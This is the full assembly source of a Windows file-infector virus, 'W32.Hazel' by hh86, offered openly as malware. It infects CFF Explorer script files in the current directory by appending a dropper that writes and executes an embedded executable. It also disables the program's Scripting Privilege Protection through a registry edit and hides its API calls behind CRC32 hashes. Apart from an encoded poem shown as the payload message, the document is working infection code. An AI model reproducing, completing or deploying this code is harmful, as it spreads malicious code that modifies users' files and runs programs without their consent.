comment °
W32.Hazel by hh86

features:
- direct action file infector of CFF script files in current directory
- appends the original code with dropper script
- supports ANSI/UTF8 and Unicode encoded scripts
- disables Scripting Privilege Protection to allow exec of privileged functions
- CRC32 instead of API names for smaller code
- supports files with ANSI/Unicode names
- unlike previous viruses, this is not position-independent code

this is a remake of W32.CFFe and W32.Grimes to infect CFF scripts

import:
- if you touch this code, you will probably break it :)
°

.386
.model  flat, stdcall
include windows.inc
include kernel32.inc
includelib kernel32.lib

include hazel.inc

.code
assume fs:nothing

code_begin      label    near

;-------------------------------------------------------------------------------
;here begins the virus code - must begin exactly at 401000h!
;-------------------------------------------------------------------------------

        pushad
        call    init_seh
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        ret

init_seh        label    near
        xor     edx, edx
        push    dword ptr fs:[edx]
        mov     dword ptr fs:[edx], esp
        mov     eax, dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.lpLoaderData]
        mov     esi, dword ptr [eax + _PEB_LDR_DATA.dwInLoadOrderModuleList.FLink]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        mov     ebp, dword ptr [eax + 18h]

;-------------------------------------------------------------------------------
;initialize API
;-------------------------------------------------------------------------------  

        call    walk_dll 
        dd      0b09315f4h                   ;CloseHandle
        dd      0a1efe929h                   ;CreateFileW
        dd      0d82bf69ah                   ;FindClose
        dd      03d3f609fh                   ;FindFirstFileW
        dd      081f39c19h                   ;FindNextFileW
        dd      07fbc7431h                   ;GlobalAlloc
        dd      0636b1e9dh                   ;GlobalFree
        dd      03fc1bd8dh                   ;LoadLibraryA
        dd      0095c03d0h                   ;ReadFile
        dd      0e1bf2253h                   ;SetFileAttributesW
        dd      0cce95612h                   ;WriteFile
        db      0
        call    load_advapi32                ;execution continues here if success

advapi32_name   label    near
        db      "advapi32", 0

subkey          label    near
        db      "Software\NTCore\CFFExplorer", 0

settings        label    near
        db      "Settings", 0

cff_suffix      label    near
        dw      "*", "c", "f", "f", 0

pestub          label    near
        db      "M",                                IMAGE_DOS_HEADER.e_magic
        db      "Z",                                IMAGE_DOS_HEADER.e_magic + 1
        db      "P",                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.Signature
        db      "E",                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.Signature + 1
        db      low IMAGE_FILE_MACHINE_I386,        IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.Machine
        db      high IMAGE_FILE_MACHINE_I386,       IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.Machine + 1
        db      1,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.NumberOfSections
        db      60h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader
        db      2,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.Characteristics
        db      low IMAGE_NT_OPTIONAL_HDR32_MAGIC,  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.Magic
        db      high IMAGE_NT_OPTIONAL_HDR32_MAGIC, IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.Magic + 1
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint + 1
        db      0ch,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.BaseOfData
        db      40h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.ImageBase + 2
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment + 1
        db      2,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.FileAlignment + 1
        db      4,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.MajorSubsystemVersion
        db      90h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage + 1
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders + 1
        db      IMAGE_SUBSYSTEM_WINDOWS_GUI,        IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.Subsystem
        db      80h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.Misc.VirtualSize + 79h
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.VirtualAddress + 79h
        db      4,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.SizeOfRawData + 79h
        db      2,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.PointerToRawData + 79h
        db      0a0h,                               IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.Characteristics + 7bh

pestub_end      label    near

advapi32_crc    label    near
        dd      0a9290135h                   ;RegCloseKey
        dd      0c13a7ad3h                   ;RegOpenKeyExA
        dd      0b039adfeh                   ;RegQueryValueExA
        dd      04f0dab99h                   ;RegSetValueExA
        db      0

;-------------------------------------------------------------------------------
;disable Scripting Privilege Protection
;------------------------------------------------------------------------------- 

disable_spp     label    near
        enter   sizeof WIN32_FIND_DATAW, 0
        lea     eax, dword ptr [esi - (offset disable_spp - offset subkey)]
        mov     edi, esp
        xor     ebx, ebx
        push    ebx
        push    esp
        push    KEY_ALL_ACCESS
        push    ebx
        push    eax
        push    HKEY_CURRENT_USER
        call    dword ptr [ebp + 4 + advapi32.aRegOpenKeyExA]
        test    eax, eax
        jnz     spp_error
        pop     edx
        push    edx                          ;RegCloseKey
        sub     esi, offset disable_spp - offset settings
        mov     al, 84h                      ;settings data size
        push    eax                          ;RegSetValueExA
        push    edi                          ;RegSetValueExA
        push    REG_BINARY                   ;RegSetValueExA
        mov     ecx, esp
        push    ebx                          ;RegSetValueExA
        push    esi                          ;RegSetValueExA
        push    edx                          ;RegSetValueExA
        push    eax
        push    esp
        push    edi
        push    ecx
        push    ebx
        push    esi
        push    edx
        call    dword ptr [ebp + 4 + advapi32.aRegQueryKeyExA]
        test    eax, eax
        pop     ecx
        jnz     spp_clserr 
        mov     dword ptr [edi + SPPEnable], ebx
        call    dword ptr [ebp + 4 + advapi32.aRegSetValueExA]
        xchg    ecx, eax
        jecxz   build_bodies

spp_clserr      label    near
        call    dword ptr [ebp + 4 + advapi32.aRegCloseKey]

spp_error       label    near
        int     3

;-------------------------------------------------------------------------------
;build CFF script (ANSI/UTF8 and Unicode versions)
;-------------------------------------------------------------------------------

build_bodies    label    near
        call    dword ptr [ebp + 4 + advapi32.aRegCloseKey]
        add     esi, 9                       ;offset cff_suffix - offset settings
        push    esp
        push    esi
        add     esi, 0ah                     ;offset pestub - offset cff_suffix
        mov     edi, 401000h + offset cff_ansibuff - code_begin
        mov     ecx, (offset pestub_end - offset pestub)
        call    store_byte                   ;store PE headers array
        mov     esi, 401000h
        mov     cx, offset cff_ansibuff - offset code_begin
        mov     eax, "{=h "
        stos    dword ptr [edi]
        call    store_byte                   ;store virus code array
        mov     esi, 401000h + offset cff_script - offset code_begin
        mov     cl, offset cff_scriptend - offset cff_script
        rep     movs byte ptr [edi], byte ptr [esi]
        mov     cx, CFFASIZE

store_unicode   label    near                ;build Unicode version
        movs    byte ptr [edi], byte ptr [esi]
        inc     edi
        loop    store_unicode
        call    dword ptr [ebp + sizeof advapi32 + 4 + kernel32.kFindFirstFileW]
        xchg    esi, eax

open_file       label    near
        mov     edi, esp
        lea     ecx, dword ptr [edi + WIN32_FIND_DATAW.cFileName]
        push    dword ptr [edi]              ;WIN32_FIND_DATAW.dwFileAttributes
        xor     ebx, ebx
        push    ecx                                  
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    3                            ;GENERIC_READ | GENERIC_WRITE
        push    ecx
        push    FILE_ATTRIBUTE_ARCHIVE
        push    ecx
        call    dword ptr [ebp + sizeof advapi32 + 4 + kernel32.kSetFileAttributesW]
        call    dword ptr [ebp + sizeof advapi32 + 4 + kernel32.kCreateFileW]
        push    eax                          ;CloseHandle
        mov     ecx, dword ptr [edi + WIN32_FIND_DATAW.nFileSizeLow]
        xchg    edi, eax
        push    ecx
        push    ebx                          ;ReadFile
        push    esp                          ;ReadFile
        push    ecx                          ;ReadFile
        lea     ecx, dword ptr [ecx + ecx + ADDSIZE]
        push    ecx
        push    GMEM_ZEROINIT
        call    dword ptr [ebp + sizeof advapi32 + 4 + kernel32.kGlobalAlloc]
        xchg    ebx, eax
        push    ebx
        push    edi
        call    dword ptr [ebp + sizeof advapi32 + 4 + kernel32.kReadFile]
        pop     ecx
        pushad
        call    infect_cff
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        push    ebx
        call    dword ptr [ebp + sizeof advapi32 + 4 + kernel32.kGlobalFree]
        call    dword ptr [ebp + sizeof advapi32 + 4 + kernel32.kCloseHandle]
        call    dword ptr [ebp + sizeof advapi32 + 4 + kernel32.kSetFileAttributesW]
        push    esp
        push    esi
        call    dword ptr [ebp + sizeof advapi32 + 4 + kernel32.kFindNextFileW]
        test    eax, eax
        jnz     open_file
        push    esi
        call    dword ptr [ebp + sizeof advapi32 + 4 + kernel32.kFindClose]

breakpoint      label    near
        int     3                            ;with you, I am alone

infect_cff      proc     near
        cdq
        push    dword ptr fs:[edx]
        mov     dword ptr fs:[edx], esp
        cmp     dword ptr [ebx + ecx - 4], "68hh"
        je      breakpoint
        cmp     word ptr [ebx], 0feffh       ;Unicode
        push    edx                                            ;WriteFile
        push    esp                                            ;WriteFile
        push    CFFASIZE                                       ;WriteFile
        push    401000h + (offset cff_ansi - offset code_begin);WriteFile
        jne     store_dropper                ;if plain ANSI or UTF8 with BOM mask skip
        add     dword ptr [esp], CFFASIZE
        shl     dword ptr [esp + 4], 1

store_dropper   label    near
        push    edi
        call    dword ptr [ebp + sizeof advapi32 + 4 + kernel32.kWriteFile]
        int     3
infect_cff      endp

store_byte      proc     near
        mov     ax, "x0"
        stos    word ptr [edi]
        lods    byte ptr [esi]
        push    eax
        and     al, 0f0h
        shr     al, 4
        cmp     al, 0ah
        sbb     al, 69h
        das
        stos    byte ptr [edi]
        pop     eax
        and     al, 0fh
        cmp     al, 0ah
        sbb     al, 69h
        das
        stos    byte ptr [edi]
        mov     al, ","
        stos    byte ptr [edi]
        loop    store_byte
        dec     edi
        mov     ax, ";}"
        stos    word ptr [edi]
        ret
store_byte      endp

;-------------------------------------------------------------------------------
;get advapi32 DLL base
;-------------------------------------------------------------------------------

load_advapi32   proc    near
        call    dword ptr [esp + 4 + kernel32.kLoadLibraryA]
        xchg    ebp, eax
        add     esi, (offset advapi32_crc - offset advapi32_name) + 5
        push    esi
        cdq
load_advapi32   endp

;-------------------------------------------------------------------------------
;DLL walker
;-------------------------------------------------------------------------------

walk_dll        proc     near
        mov     ebx, ebp
        mov     eax, dword ptr [ebp + IMAGE_DOS_HEADER.e_lfanew]
        add     ebx, dword ptr [ebp + eax + IMAGE_DOS_HEADER.e_lfanew shl 1]
        pop     esi
        
walk_names      label    near
        mov     eax, ebp
        mov     edi, ebp
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
        add     edi, dword ptr [eax + edx * 4]
        or      eax, -1

crc32_l1        label    near
        xor     al, byte ptr [edi]
        push    8
        pop     ecx

crc32_l2        label    near
        shr     eax, 1
        jnc     crc32_l3
        xor     eax, 0edb88320h

crc32_l3        label    near
        loop    crc32_l2
        inc     edi
        cmp     byte ptr [edi], cl
        jne     crc32_l1
        not     eax
        inc     edx
        cmp     dword ptr [esi], eax
        jne     walk_names
        mov     eax, ebp
        mov     edi, ebp
        add     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
        movzx   edi, word ptr [edi + edx * 2 - 2]
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
        mov     eax, dword ptr [eax + edi * 4]
        add     eax, ebp
        push    eax
        lods    dword ptr [esi]
        sub     cl, byte ptr [esi]
        jnz     walk_names
        inc     esi
        jmp     esi
walk_dll        endp

cff_script      label    near                ;CFF dropper code
        db      's="suzuka.exe";b="";for n=0,1600 do b=b.."h" end;l=CreateLog(s);LogPrint(l,b);CloseLog(l);'
        db      'FillBytes(s,0,#b,0);for n=0,#p,2 do WriteByte(s,p[n+1],p[n])end;WriteBytes(s,512,h);ExecuteApp(s)--hh86'

cff_scriptend   label    near

cff_ansi        label    near
        db      0ah, 0dh, "p={"

cff_ansibuff    label    near
        db      CFFASIZE - (offset cff_ansibuff - offset cff_ansi) dup (0)

cff_unicode     label    near
        db      CFFASIZE * 2 dup (0)

;-------------------------------------------------------------------------------
;here ends the virus code
;-------------------------------------------------------------------------------

link_text       proc     near
        call    text_end

text_begin      label    near
        db      49h, 20h, 63h, 68h
        db      72h, 69h, 73h, 74h
        db      65h, 6eh, 20h, 79h
        db      6fh, 75h, 72h, 20h
        db      66h, 72h, 69h, 67h
        db      68h, 74h, 65h, 6eh
        db      69h, 6eh, 67h, 20h
        db      66h, 6ch, 69h, 67h
        db      68h, 74h, 3ah, 0ah
        db      0dh, 59h, 6fh, 75h
        db      6eh, 67h, 20h, 65h
        db      61h, 67h, 6ch, 65h
        db      2ch, 20h, 72h, 69h
        db      73h, 65h, 20h, 69h
        db      6eh, 20h, 74h, 68h
        db      65h, 20h, 61h, 69h
        db      72h, 21h, 0ah, 0dh
        db      59h, 6fh, 75h, 20h
        db      73h, 74h, 61h, 72h
        db      65h, 64h, 20h, 61h
        db      74h, 20h, 74h, 68h
        db      65h, 20h, 73h, 75h
        db      6eh, 21h, 20h, 2dh
        db      20h, 6dh, 79h, 20h
        db      6ch, 69h, 67h, 68h
        db      74h, 0ah, 0dh, 41h
        db      6eh, 64h, 20h, 64h
        db      65h, 6ch, 69h, 63h
        db      61h, 74h, 65h, 20h
        db      67h, 61h, 7ah, 65h
        db      20h, 63h, 61h, 6eh
        db      27h, 74h, 20h, 63h
        db      6fh, 6dh, 70h, 61h
        db      72h, 65h, 2eh, 0ah
        db      0dh, 0ah, 0dh, 49h
        db      20h, 73h, 74h, 6fh
        db      6fh, 64h, 2ch, 20h
        db      6dh, 6fh, 72h, 65h
        db      20h, 74h, 65h, 6eh
        db      64h, 65h, 72h, 20h
        db      74h, 68h, 61h, 6eh
        db      20h, 74h, 68h, 6fh
        db      73h, 65h, 0ah, 0dh
        db      57h, 68h, 6fh, 27h
        db      76h, 65h, 20h, 77h
        db      69h, 74h, 6eh, 65h
        db      73h, 73h, 65h, 64h
        db      20h, 79h, 6fh, 75h
        db      20h, 64h, 69h, 73h
        db      61h, 70h, 70h, 65h
        db      61h, 72h, 2eh, 2eh
        db      2eh, 0ah, 0dh, 49h
        db      27h, 6dh, 20h, 6bh
        db      69h, 73h, 73h, 69h
        db      6eh, 67h, 20h, 79h
        db      6fh, 75h, 20h, 6eh
        db      6fh, 77h, 20h, 2dh
        db      20h, 61h, 63h, 72h
        db      6fh, 73h, 73h, 0ah
        db      0dh, 54h, 68h, 65h
        db      20h, 67h, 61h, 70h
        db      20h, 6fh, 66h, 20h
        db      61h, 20h, 74h, 68h
        db      6fh, 75h, 73h, 61h
        db      6eh, 64h, 20h, 79h
        db      65h, 61h, 72h, 73h
        db      2eh, 0ah, 0dh
        db      "Marina Tsvetaeva (1916)"

text_end        label    near
        pop     ecx
        xor     ebx, ebx
        push    500h
        push    ebx
        push    ebx
        push    offset text_end - offset text_begin
        push    ecx 
        push    -0bh                         ;STD_OUTPUT_HANDLE
        call    WriteFile
        call    Sleep
        call    ExitProcess
link_text       endp

code_entry      proc     near
        push    offset link_text
        push    dword ptr fs:[0]
        mov     dword ptr fs:[0], esp
        jmp     code_begin
code_entry      endp

end     code_entry
